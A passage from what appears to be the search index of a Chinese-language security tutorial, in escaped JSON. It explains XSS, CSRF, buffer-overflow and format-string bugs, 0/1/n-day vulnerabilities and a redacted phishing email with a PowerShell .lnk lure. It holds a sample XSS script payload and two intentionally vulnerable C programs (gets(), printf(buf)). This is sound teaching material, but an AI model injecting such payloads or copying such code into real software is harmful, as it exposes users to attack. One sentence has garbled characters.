<pre><code>&lt;p&gt;\u200b\u7528\u6237\u200b\u8bc4\u8bba\u200b\uff1a&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/p&gt;\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u6240\u6709\u200b\u8bbf\u95ee\u200b\u8fd9\u4e2a\u200b\u9875\u9762\u200b\u7684\u200b\u7528\u6237\u200b\u90fd\u200b\u4f1a\u200b\u5f39\u51fa\u200b\u5bf9\u8bdd\u6846\u200b\u3002\u200b\u7531\u4e8e\u200b JavaScript \u200b\u4ee3\u7801\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\u7528\u6237\u200b\u7684\u200b Cookie \u200b\u4e0e\u200b LocalStorage\uff0c\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u7a83\u53d6\u200b\u7528\u6237\u200b\u7684\u200b\u51ed\u8bc1\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4ee5\u200b\u7528\u6237\u200b\u7684\u200b\u8eab\u4efd\u200b\u8fdb\u884c\u200b\u64cd\u4f5c\u200b\uff08\u200b\u5373\u4f7f\u200b\u4e0d\u200b\u77e5\u9053\u200b\u7528\u6237\u200b\u7684\u200b\u5bc6\u7801\u200b\uff01\uff09\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4e00\u4e9b\u200b\u5176\u4ed6\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u4f8b\u5982\u200b CSRF\uff08\u200b\u8de8\u7ad9\u200b\u8bf7\u6c42\u200b\u4f2a\u9020\u200b\uff09\uff1a\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u6784\u9020\u200b\u9875\u9762\u200b\uff0c\u200b\u7528\u6237\u200b\u5728\u200b\u8bbf\u95ee\u200b\u8fd9\u4e2a\u200b\u9875\u9762\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f1a\u200b\u5411\u200b\u76ee\u6807\u200b\u7f51\u7ad9\u200b\u53d1\u9001\u200b\u6076\u610f\u200b\u8bf7\u6c42\u200b\uff08\u200b\u4f8b\u5982\u200b\u8f6c\u8d26\u200b\u3001\u200b\u4fee\u6539\u200b\u5bc6\u7801\u200b\u7b49\u200b\uff09\u3002\u200b\u5982\u679c\u200b\u76ee\u6807\u200b\u7f51\u7ad9\u200b\u6ca1\u6709\u200b\u5bf9\u200b\u8fd9\u6837\u200b\u7684\u200b\u8bf7\u6c42\u200b\u6709\u6240\u200b\u9632\u5fa1\u200b\uff08\u200b\u4f8b\u5982\u200b\u4f7f\u7528\u200b CSRF Token\u3001\u200b\u9a8c\u8bc1\u200b Referer \u200b\u7b49\u200b\uff09\uff0c\u200b\u90a3\u4e48\u200b\u653b\u51fb\u8005\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b\u8fd9\u4e2a\u200b\u6f0f\u6d1e\u200b\u4ee5\u200b\u7528\u6237\u200b\u7684\u200b\u8eab\u4efd\u200b\u6267\u884c\u200b\u64cd\u4f5c\u200b\u3002</p>"},{"location":"ops/security/#binary-vulnerabilities","title":"\u4e8c\u8fdb\u5236\u200b\u6f0f\u6d1e","text":"<p>\u200b\u4e8c\u8fdb\u5236\u200b\u6f0f\u6d1e\u200b\u662f\u200b\u53e6\u200b\u4e00\u79cd\u200b\u8f83\u4e3a\u200b\u5e38\u89c1\u200b\u7684\u200b\u653b\u51fb\u65b9\u5f0f\u200b\uff0c\u200b\u901a\u5e38\u200b\u662f\u200b\u5185\u5b58\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\uff08\u200b\u4f8b\u5982\u200b\u7f13\u51b2\u533a\u200b\u6ea2\u51fa\u200b\u7b49\u200b\uff09\u3002\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u6784\u9020\u200b\u7279\u5b9a\u200b\u7684\u200b\u8f93\u5165\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u7a0b\u5e8f\u6267\u884c\u200b\u51fa\u73b0\u200b\u975e\u200b\u9884\u671f\u200b\u7684\u200b\u884c\u4e3a\u200b\uff0c\u200b\u8fd0\u884c\u200b\u6076\u610f\u4ee3\u7801\u200b\u3002\u200b\u4f8b\u5982\u200b\u4ee5\u4e0b\u200b\u7684\u200b C \u200b\u4ee3\u7801\u200b\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    char buf[8];\n    gets(buf);\n    printf(\"Hello, %s!\\n\", buf);\n    return 0;\n}\n</code></pre> <p>\u200b\u7531\u4e8e\u200b <code>gets()</code> \u200b\u51fd\u6570\u200b\u4e0d\u4f1a\u200b\u68c0\u67e5\u200b\u8f93\u5165\u200b\u957f\u5ea6\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u8f93\u5165\u200b\u8d85\u8fc7\u200b 8 \u200b\u4e2a\u5b57\u7b26\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8986\u76d6\u200b <code>main()</code> \u200b\u51fd\u6570\u200b\u7684\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b\u3002\u200b\u5982\u679c\u200b\u6808\u6709\u200b\u53ef\u200b\u6267\u884c\u200b\u6743\u9650\u200b\uff08\u200b\u73b0\u4ee3\u200b\u7a0b\u5e8f\u200b\u4e00\u822c\u200b\u4e0d\u4f1a\u200b\u6709\u200b\uff09\uff0c\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u6784\u9020\u200b\u6076\u610f\u200b\u7684\u200b shellcode\uff0c\u200b\u4f7f\u5f97\u200b\u7a0b\u5e8f\u6267\u884c\u200b\u4efb\u610f\u200b\u4ee3\u7801\u200b\uff1b\u200b\u5373\u4f7f\u200b\u6ca1\u6709\u200b\u53ef\u200b\u6267\u884c\u200b\u6743\u9650\u200b\uff0c\u200b\u901a\u8fc7\u200b ROP\uff08Return-Oriented Programming\uff09\u200b\u653b\u51fb\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u6267\u884c\u200b\u4efb\u610f\u200b\u4ee3\u7801\u200b\u3002</p> <p>\u200b\u6709\u65f6\u5019\u200b\u4e00\u4e9b\u200b\u5185\u5b58\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\u6ca1\u6709\u200b\u90a3\u4e48\u200b\u660e\u663e\u200b\uff0c\u200b\u4f8b\u5982\u200b\u4e0b\u9762\u200b\u8fd9\u4e2a\u200b\u4f8b\u5b50\u200b\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    char buf[8];\n    fgets(buf, 8, stdin);\n    printf(buf);\n    return 0;\n}\n</code></pre> <p>\u200b\u8fd9\u4e2a\u200b\u7a0b\u5e8f\u200b\u770b\u8d77\u6765\u200b\u6ca1\u6709\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f46\u662f\u200b\u5982\u679c\u200b\u7528\u6237\u200b\u8f93\u5165\u200b\u7684\u200b\u5185\u5bb9\u200b\u4e2d\u200b\u5305\u542b\u200b\u7c7b\u4f3c\u200b <code>%s</code> \u200b\u7684\u200b\u683c\u5f0f\u5316\u200b\u5b57\u7b26\u4e32\u200b\uff0c\u200b\u90a3\u4e48\u200b <code>printf()</code> \u200b\u51fd\u6570\u200b\u5c31\u200b\u4f1a\u200b\u6309\u7167\u200b\u7528\u6237\u200b\u8f93\u5165\u200b\u7684\u200b\u5185\u5bb9\u200b\u8fdb\u884c\u200b\u683c\u5f0f\u5316\u200b\u8f93\u51fa\u200b\u3002\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u6784\u9020\u200b\u6076\u610f\u200b\u7684\u200b\u683c\u5f0f\u5316\u200b\u5b57\u7b26\u4e32\u200b\u6765\u200b\u8bfb\u53d6\u200b\u751a\u81f3\u200b\u5199\u5165\u200b\u6307\u5b9a\u200b\u5185\u5b58\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u8fbe\u5230\u200b\u81ea\u5df1\u200b\u7684\u200b\u76ee\u7684\u200b\u3002</p> <p>\u200b\u4ec0\u4e48\u200b\uff0c\u200b\u8fd9\u6837\u200b\u8fd8\u200b\u80fd\u200b\u5199\u5165\u200b\u6570\u636e\u200b\uff1f</p> <p><code>%n</code> \u200b\u683c\u5f0f\u5316\u200b\u5b57\u7b26\u4e32\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u5f53\u524d\u200b\u5df2\u7ecf\u200b\u8f93\u51fa\u200b\u7684\u200b\u5b57\u7b26\u200b\u6570\u200b\u5199\u5165\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6574\u578b\u200b\u6307\u9488\u200b\u53c2\u6570\u200b\u6240\u6307\u200b\u7684\u200b\u53d8\u91cf\u200b\u3002</p> <p>@taoky: \u200b\u5173\u4e8e\u200b\u5927\u4e00\u200b\u7684\u200b\u300c\u200b\u7a0b\u5e8f\u8bbe\u8ba1\u200b\u300d\u200b\u6559\u5b66\u200b</p> <p>\u200b\u770b\u200b\u4e0a\u9762\u200b\u7684\u200b\u4ee3\u7801\u200b\uff0c\u200b\u4f60\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u89c9\u5f97\u200b\u6709\u70b9\u200b\u719f\u6089\u200b\u2014\u2014\u200b\u56e0\u4e3a\u200b\u4f60\u200b\u53ef\u80fd\u200b\u5728\u200b\uff08\u200b\u5927\u4e00\u200b\u6216\u8005\u200b\u66f4\u200b\u65e9\u200b\uff09\u200b\u521d\u5b66\u200b C \u200b\u8bed\u8a00\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u5199\u200b\u8fc7\u200b\u8fd9\u6837\u200b\u7684\u200b\u95ee\u9898\u200b\u4ee3\u7801\u200b\u3002\u200b\u76f4\u5230\u200b\u5f88\u4e45\u5f88\u4e45\u200b\u4e4b\u540e\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u53d1\u89c9\u200b\u8fd9\u6837\u200b\u7684\u200b\u4ee3\u7801\u200b\u662f\u200b\u6709\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\u7684\u200b\u3002</p> <p>\u200b\u5728\u200b\u7406\u60f3\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u5b66\u4e60\u200b C \u200b\u7684\u200b\u65f6\u5019\u200b\u5e94\u5f53\u200b\u5bf9\u200b\u5185\u5b58\u200b\u6a21\u578b\u200b\u4e0e\u200b\u5185\u5b58\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b\u6709\u200b\u57fa\u672c\u200b\u7684\u200b\u4e86\u89e3\u200b\uff0c\u200b\u4f46\u662f\u200b\u5728\u200b\u4e00\u4e2a\u200b\u5b66\u671f\u200b\u5bf9\u200b\u5b8c\u5168\u200b\u6ca1\u6709\u200b\u7f16\u7a0b\u200b\u57fa\u7840\u200b\u7684\u200b\u5b66\u751f\u200b\u8fdb\u884c\u200b\u6559\u5b66\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u8fd9\u4e48\u200b\u505a\u200b\u4e0d\u662f\u200b\u5f88\u200b\u73b0\u5b9e\u200b\u3002\u200b\u7ed3\u679c\u200b\u5c31\u662f\u200b\uff0c\u200b\u5728\u200b\u6279\u6539\u4f5c\u4e1a\u200b\u548c\u200b\u8003\u8bd5\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u80fd\u200b\u5bf9\u200b\u7c7b\u4f3c\u200b <code>gets()</code> \u200b\u8fd9\u6837\u200b\u7684\u200b\u7528\u6cd5\u200b\u5f00\u7eff\u706f\u200b\u3002\u200b\u751a\u81f3\u200b\u6211\u200b\u542c\u95fb\u200b\u6709\u4eba\u200b\u89c9\u5f97\u200b\u6570\u7ec4\u200b\u8d8a\u754c\u200b\u4e5f\u200b\u6ca1\u4e8b\u200b\uff0c\u200b\u53ea\u8981\u200b\u4e0d\u5199\u200b\u5230\u200b\u5176\u4ed6\u200b\u6570\u636e\u7ed3\u6784\u200b\u7684\u200b\u5185\u5b58\u200b\u4e0a\u200b\u5c31\u200b\u884c\u200b\u2014\u2014\u200b\u8fd9\u662f\u200b\u975e\u5e38\u200b\u5371\u9669\u200b\u7684\u200b\u60f3\u6cd5\u200b\u3002</p>"},{"location":"ops/security/#0day-1day-nday","title":"0-day/1-day/n-day \u200b\u6f0f\u6d1e","text":"<p>\u200b\u5305\u542b\u200b\u590d\u6742\u200b\u529f\u80fd\u200b\u7684\u200b\u8ba1\u7b97\u673a\u7a0b\u5e8f\u200b\u51e0\u4e4e\u200b\u4e0d\u200b\u53ef\u80fd\u200b\u505a\u5230\u200b\u6ca1\u6709\u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u4e0e\u200b\u5b89\u5168\u200b\u7814\u7a76\u200b\u4eba\u5458\u200b\u90fd\u200b\u4f1a\u200b\u4e0d\u65ad\u200b\u5bfb\u627e\u200b\u8bf8\u5982\u200b\u5e38\u7528\u8f6f\u4ef6\u200b\u3001\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u3001\u200b\u7f51\u7edc\u8bbe\u5907\u200b\u7b49\u200b\u7684\u200b\u6f0f\u6d1e\u200b\u3002\u200b\u5176\u4e2d\u200b 0-day \u200b\u6f0f\u6d1e\u200b\u6307\u4ee3\u200b\u8f6f\u4ef6\u200b\u5f00\u53d1\u8005\u200b\uff08\u200b\u901a\u5e38\u200b\uff09\u200b\u4e0d\u77e5\u60c5\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e5f\u200b\u6ca1\u6709\u200b\u8865\u4e01\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff0c1-day \u200b\u6f0f\u6d1e\u200b\u5219\u200b\u6307\u4ee3\u200b\u6f0f\u6d1e\u200b\u5df2\u7ecf\u200b\u516c\u5e03\u200b\u3001\u200b\u5df2\u7ecf\u200b\u6709\u200b\u8865\u4e01\u200b\u6216\u8005\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff0c\u200b\u4f46\u662f\u200b\u7531\u4e8e\u200b\u65f6\u95f4\u200b\u8f83\u200b\u77ed\u200b\uff0c\u200b\u4ecd\u7136\u200b\u6709\u200b\u5f88\u591a\u200b\u7cfb\u7edf\u200b\u6ca1\u6709\u200b\u5b89\u88c5\u200b\u8865\u4e01\u200b\u7684\u200b\u6f0f\u6d1e\u200b\uff0cn-day \u200b\u6f0f\u6d1e\u200b\u5219\u200b\u662f\u200b\u6307\u4ee3\u200b\u6f0f\u6d1e\u200b\u5df2\u7ecf\u200b\u516c\u5e03\u200b\u5f88\u200b\u4e45\u200b\uff0c\u200b\u4f46\u662f\u200b\u4ecd\u7136\u200b\u6709\u200b\u4e00\u90e8\u5206\u200b\u7cfb\u7edf\u200b\u6ca1\u6709\u200b\u5b89\u88c5\u200b\u8865\u4e01\u200b\u7684\u200b\u6f0f\u6d1e\u200b\u3002</p> <p>0-day \u200b\u6f0f\u6d1e\u200b\u901a\u5e38\u200b\u4ef7\u503c\u200b\u4e0d\u83f2\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6ca1\u6709\u200b\u5f88\u200b\u597d\u200b\u7684\u200b\u901a\u7528\u200b\u9632\u5fa1\u200b\u65b9\u6cd5\u200b\u3002\u200b\u5c3d\u7ba1\u200b\u5927\u90e8\u5206\u200b\u8bfb\u8005\u200b\u90fd\u200b\u4e0d\u200b\u503c\u5f97\u200b\u88ab\u200b 0-day \u200b\u6f0f\u6d1e\u200b\u653b\u51fb\u200b\uff0c\u200b\u4f46\u200b\u8fd9\u200b\u4e0d\u200b\u4ee3\u8868\u200b\u4f60\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u653b\u51fb\u200b\u2014\u2014\u200b\u4f8b\u5982\u200b 2023 \u200b\u5e74\u524d\u200b\uff0c\ufffd\ufffd\ufffd\u200b\u5c31\u200b\u5728\u200b\u81ea\u5df1\u200b\u7684\u200b\u5b89\u5353\u200b\u5b89\u88c5\u5305\u200b\u4e2d\u200b\u52a0\u5165\u200b\u4e86\u200b\u4e00\u4e9b\u200b 0-day \u200b\u6f0f\u6d1e\u200b\uff0c\u200b\u4ee5\u6b64\u200b\u7a83\u53d6\u200b\u7528\u6237\u200b\u624b\u673a\u200b\u7684\u200b\u9690\u79c1\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u800c\u200b 1-day \u200b\u6f0f\u6d1e\u200b\u5219\u200b\u9700\u8981\u200b\u8fd0\u7ef4\u200b\u53ca\u65f6\u200b\u54cd\u5e94\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u6b64\u65f6\u200b PoC\uff08Proof of Concept\uff0c\u200b\u6f0f\u6d1e\u200b\u5229\u7528\u200b\u7684\u200b\u793a\u4f8b\u200b\u4ee3\u7801\u200b\uff09\u200b\u4e00\u822c\u200b\u5df2\u7ecf\u200b\u516c\u5f00\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u5f88\u5feb\u200b\u5730\u200b\u5229\u7528\u200b\u8fd9\u4e2a\u200b\u6f0f\u6d1e\u200b\uff1b\u200b\u5373\u4f7f\u200b\u6682\u65f6\u200b\u6ca1\u6709\u200b\u516c\u5f00\u200b\uff0c\u200b\u4e5f\u200b\u4f1a\u200b\u6709\u200b\u5f88\u591a\u200b\u4eba\u200b\u5c1d\u8bd5\u200b\u7f16\u5199\u200b PoC\u3002n-day \u200b\u6f0f\u6d1e\u200b\u4e00\u822c\u200b\u5df2\u7ecf\u200b\u6709\u200b\u975e\u5e38\u200b\u6210\u719f\u200b\u7684\u200b\u653b\u51fb\u200b\u5de5\u5177\u200b\uff0c\u200b\u5982\u679c\u200b\u7ef4\u62a4\u200b\u4eba\u5458\u200b\u7ba1\u7406\u200b\u4e0d\u5f53\u200b\uff0c\u200b\u5c31\u200b\u5f88\u200b\u5bb9\u6613\u200b\u4e2d\u62db\u200b\uff08\u200b\u4f8b\u5982\u200b 2017 \u200b\u5e74\u200b\u516c\u5e03\u200b\u7684\u200b\u6c38\u6052\u200b\u4e4b\u200b\u84dd\u200b\u6f0f\u6d1e\u200b MS17-010\uff0c\u200b\u5373\u4f7f\u200b\u5df2\u7ecf\u200b\u65f6\u9694\u200b\u8d85\u8fc7\u200b 7 \u200b\u5e74\u200b\uff0c\u200b\u7531\u4e8e\u200b\u4e00\u4e9b\u200b\u5355\u4f4d\u200b\u7684\u200b\u5185\u7f51\u200b\u7ba1\u7406\u200b\u4e0d\u5f53\u200b\uff0c\u200b\u65f6\u81f3\u4eca\u65e5\u200b\u4f9d\u7136\u200b\u662f\u200b\u653b\u51fb\u8005\u200b\u5728\u5185\u200b\u7f51\u200b\u6e17\u900f\u200b\u4e2d\u200b\u5f88\u200b\u6709\u7528\u200b\u7684\u200b\u5de5\u5177\u200b\uff09\u3002</p>"},{"location":"ops/security/#social-engineering","title":"\u793e\u4f1a\u200b\u5de5\u7a0b\u5b66","text":"<p>\u200b\u4eba\u7c7b\u200b\u81ea\u5df1\u200b\u901a\u5e38\u200b\u662f\u200b\u8ba1\u7b97\u673a\u200b\u5b89\u5168\u200b\u4e2d\u200b\u6700\u200b\u8584\u5f31\u200b\u7684\u200b\u4e00\u73af\u200b\u3002\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u6b3a\u9a97\u200b\u3001\u200b\u5a01\u80c1\u200b\u3001\u200b\u5229\u8bf1\u200b\u7b49\u200b\u624b\u6bb5\u200b\u83b7\u53d6\u200b\u7528\u6237\u200b\u7684\u200b\u654f\u611f\u200b\u4fe1\u606f\u200b\u3002\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u7684\u200b\u4f8b\u5b50\u200b\u5305\u62ec\u200b\uff1a</p> <ul> <li>\u200b\u9493\u9c7c\u200b\u90ae\u4ef6\u200b\uff1a\u200b\u4f8b\u5982\u200b\u4f2a\u88c5\u6210\u200b\u53d1\u7968\u200b\u3001\u200b\u4e0a\u7ea7\u200b\u901a\u77e5\u200b\u3001\u200b\u9000\u7a0e\u200b\u90ae\u4ef6\u200b\u7b49\u200b\uff0c\u200b\u6b3a\u9a97\u200b\u7528\u6237\u200b\u70b9\u51fb\u200b\u6076\u610f\u200b\u94fe\u63a5\u200b\u3001\u200b\u6267\u884c\u200b\u6076\u610f\u200b\u9644\u4ef6\u200b\u3002</li> <li>\u200b\u5229\u8bf1\u200b\uff1a\u200b\u4f8b\u5982\u200b\u6709\u507f\u200b\u8d2d\u4e70\u200b\u7528\u6237\u200b\u7684\u200b\u6821\u56ed\u5361\u200b/\u200b\u5de5\u5361\u200b/VPN \u200b\u8ba4\u8bc1\u200b\u8d26\u53f7\u200b\u7b49\u200b\u3002</li> </ul> <p>\u200b\u9493\u9c7c\u200b\u90ae\u4ef6\u200b\u793a\u4f8b\u200b</p> <p>\u200b\u5c3d\u7ba1\u200b\u6211\u4eec\u200b\u4e00\u822c\u200b\u6536\u5230\u200b\u7684\u200b\u5f88\u591a\u200b\u9493\u9c7c\u200b\u90ae\u4ef6\u200b\u90fd\u200b\u80fd\u591f\u200b\u4e00\u773c\u200b\u8bc6\u7834\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e5f\u200b\u5b58\u5728\u200b\u7cbe\u5fc3\u5236\u4f5c\u200b\u7684\u200b\u9493\u9c7c\u200b\u90ae\u4ef6\u200b\u3002\u200b\u7279\u522b\u200b\u662f\u200b\u9488\u5bf9\u200b\u9ad8\u200b\u4ef7\u503c\u200b\u76ee\u6807\u200b\uff0c\u200b\u5982\u679c\u200b\u7cbe\u5fc3\u5236\u4f5c\u200b\u7684\u200b\u9493\u9c7c\u200b\u90ae\u4ef6\u200b\u80fd\u591f\u200b\u4e3a\u200b\u653b\u51fb\u8005\u200b\u6253\u5f00\u200b\u4fb5\u5165\u200b\u7684\u200b\u5927\u95e8\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c3d\u53ef\u80fd\u200b\u4f2a\u88c5\u200b\u9493\u9c7c\u200b\u90ae\u4ef6\u200b\u7684\u200b\u6210\u672c\u200b\u662f\u200b\u503c\u5f97\u200b\u7684\u200b\u3002\u200b\u8fd9\u200b\u4e5f\u200b\u662f\u200b APT\uff08Advanced Persistent Threat\uff0c\u200b\u9ad8\u7ea7\u200b\u6301\u7eed\u6027\u200b\u5a01\u80c1\u200b\uff09\u200b\u653b\u51fb\u200b\u5e38\u89c1\u200b\u7684\u200b\u8d77\u59cb\u200b\u6b65\u9aa4\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u5206\u4eab\u200b\u4e00\u5219\u200b\u6211\u4eec\u200b\u771f\u5b9e\u200b\u6536\u5230\u200b\u7cbe\u5fc3\u5236\u4f5c\u200b\u7684\u200b\u9493\u9c7c\u200b\u90ae\u4ef6\u200b\uff0c\u200b\u9690\u53bb\u200b\u4e86\u200b\u90e8\u5206\u200b\u7ec6\u8282\u200b\uff1a</p> <pre><code>FROM: xxxxx &lt;xxxxx@163.com&gt;\nTO: xxxxx@ustc.edu.cn\nSUBJECT: \u200b\u5173\u4e8e\u200b\u4e2d\u56fd\u200b\u79d1\u5b66\u6280\u672f\u200b\u5927\u5b66\u200b\u7edf\u4e00\u200b\u7535\u5b50\u200b\u7b7e\u7ae0\u200b\u5e73\u53f0\u200b\u4e0a\u7ebf\u200b\u8bd5\u8fd0\u884c\u200b\u7684\u200b\u901a\u77e5\u200b\n\n\u200b\u5404\u200b\u5355\u4f4d\u200b\uff1a\n\u200b\u4e3a\u200b\u843d\u5b9e\u200b\u201c\u200b\u667a\u6167\u200b\u79d1\u5927\u200b\u201d\u200b\u6570\u5b57\u5316\u200b\u53d1\u5c55\u200b\u6218\u7565\u200b\uff0c\u200b\u63a8\u8fdb\u200b\u65e0\u7eb8\u5316\u200b\u529e\u516c\u200b\u76ee\u6807\u200b\uff0c\u200b\u7f13\u89e3\u200b\u5e08\u751f\u200b\u7ebf\u4e0b\u200b\u529e\u4e8b\u200b\u96be\u9898\u200b\uff0c\u200b\u5b66\u6821\u200b\u89c4\u5212\u200b\u5efa\u8bbe\u200b\u7684\u200b\u79d1\u5927\u200b\u7edf\u4e00\u200b\u7535\u5b50\u7b7e\u540d\u200b\u5e73\u53f0\u200b\u5df2\u200b\u8bd5\u8fd0\u884c\u200b\u3002\n\n\u200b\u5e73\u53f0\u200b\u63d0\u4f9b\u200b\u5b89\u5168\u53ef\u9760\u200b\u7684\u200b\u7535\u5b50\u7b7e\u540d\u200b\u670d\u52a1\u200b\u80fd\u529b\u200b\uff0c\u200b\u5305\u62ec\u200b\u7edf\u4e00\u200b\u7535\u5b50\u7b7e\u540d\u200b\u5e73\u53f0\u200b\uff0c\u200b\u6b22\u8fce\u200b\u5168\u6821\u200b\u5404\u200b\u5355\u4f4d\u200b\u53ca\u200b\u5e08\u751f\u200b\u4f7f\u7528\u200b\u7edf\u4e00\u200b\u7535\u5b50\u7b7e\u540d\u200b\u5e73\u53f0\u200b\u3002\n\n\u200b\u7535\u5b50\u7b7e\u540d\u200b\u5e73\u53f0\u200b\u4f7f\u7528\u200b\u8bf4\u660e\u200b\u89c1\u200b\u9644\u4ef6\u200b\n\n\u200b\u5bc6\u7801\u200b\uff1a12345\n\n\u200b\u4e2d\u56fd\u200b\u79d1\u5b66\u6280\u672f\u200b\u5927\u5b66\u200b\n63602393\n</code></pre> <p>\u200b\u5982\u679c\u200b\u4e0d\u770b\u200b <code>FROM</code>\uff0c\u200b\u90ae\u4ef6\u200b\u770b\u8d77\u6765\u200b\u8fd8\u200b\u6bd4\u8f83\u200b\u771f\u5b9e\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u90ae\u4ef6\u200b\u4e2d\u200b\u7684\u200b\u5185\u5bb9\u200b\u90fd\u200b\u662f\u200b\u516c\u5f00\u200b\u4fe1\u606f\u200b\u3002\u200b\u9644\u4ef6\u200b <code>21333.rar</code> \u200b\u4e3a\u200b\u52a0\u5bc6\u200b\u538b\u7f29\u5305\u200b\uff08\u200b\u9003\u907f\u200b\u90ae\u4ef6\u7cfb\u7edf\u200b\u5bf9\u200b\u9644\u4ef6\u200b\u5185\u5bb9\u200b\u7684\u200b\u75c5\u6bd2\u200b\u68c0\u67e5\u200b\uff09\uff0c\u200b\u538b\u7f29\u5305\u200b\u5185\u200b\u5305\u542b\u200b\u4e86\u200b Windows \u200b\u5feb\u6377\u65b9\u5f0f\u200b\u6587\u4ef6\u200b <code>21333.pdf.lnk</code>\uff0c\u200b\u56fe\u6807\u200b\u4e3a\u200b Microsoft Edge \u200b\u7684\u200b\u3002\u200b\u800c\u200b\u8fd9\u4e2a\u200b\u5feb\u6377\u65b9\u5f0f\u200b\u7684\u200b\u76ee\u6807\u200b\u662f\u200b <code>powershell.exe</code>\uff0c\u200b\u547d\u4ee4\u884c\u200b\u53c2\u6570\u200b\u5305\u542b\u200b\u4e86\u200b\u4ece\u200b\u5916\u90e8\u200b\u7f51\u7ad9\u200b\u4e0b\u8f7d\u200b PDF \u200b\u4e0e\u200b\u653b\u51fb\u200b\u8d1f\u8f7d\u200b\uff0c\u200b\u6253\u5f00\u200b PDF \u200b\u4e0e\u200b\u8fd0\u884c\u200b\u653b\u51fb\u200b\u8d1f\u8f7d\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002\u200b\u5982\u679c\u200b\u4e0d\u614e\u200b\u70b9\u51fb\u200b\u5c31\u200b\u4f1a\u200b\u4e2d\u62db\u200b\uff0c\u200b\u5e76\u4e14\u200b\u7531\u4e8e\u200b\u771f\u7684\u200b\u4f1a\u200b\u6253\u5f00\u200b PDF\uff0c\u200b\u4e2d\u62db\u200b\u4e4b\u540e\u200b\u53ef\u80fd\u200b\u7b2c\u4e00\u200b\u65f6\u95f4\u200b\u65e0\u6cd5\u200b\u53d1\u73b0\u200b\u3002</p>"},{"location":"ops/security/#dos-attacks","title":"\u62d2\u7edd\u670d\u52a1\u200b\u653b\u51fb","text":"<p>\u200b\u6709\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u7684\u200b\u76ee\u6807\u200b\u4e0d\u662f\u200b\u4e3a\u4e86\u200b\u83b7\u53d6\u4fe1\u606f\u200b\uff0c\u200b\u800c\u662f\u200b\u4e3a\u4e86\u200b\u7834\u574f\u200b\u7cfb\u7edf\u200b\u7684\u200b\u53ef\u7528\u6027\u200b\u3002\u200b\u8fd9\u4e48\u200b\u505a\u200b\u7684\u200b\u76ee\u7684\u200b\u53ef\u80fd\u200b\u662f\u200b\u4e3a\u4e86\u200b\u6572\u8bc8\u52d2\u7d22\u200b\u3001\u200b\u62a5\u590d\u200b\uff0c\u200b\u4e5f\u200b\u6709\u200b\u53ef\u80fd\u200b\u53ea\u662f\u200b\u4e3a\u4e86\u200b\u6ee1\u8db3\u200b\u81ea\u5df1\u200b\u7684\u200b\uff08\u200b\u626d\u66f2\u200b\uff09\u200b\u5fc3\u7406\u200b\u3002\u200b\u62d2\u7edd\u670d\u52a1\u200b\u653b\u51fb\u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b DoS\uff08Denial of Service\uff09\u200b\u653b\u51fb\u200b\u3002\u200b\u4e00\u90e8\u5206\u200b DoS 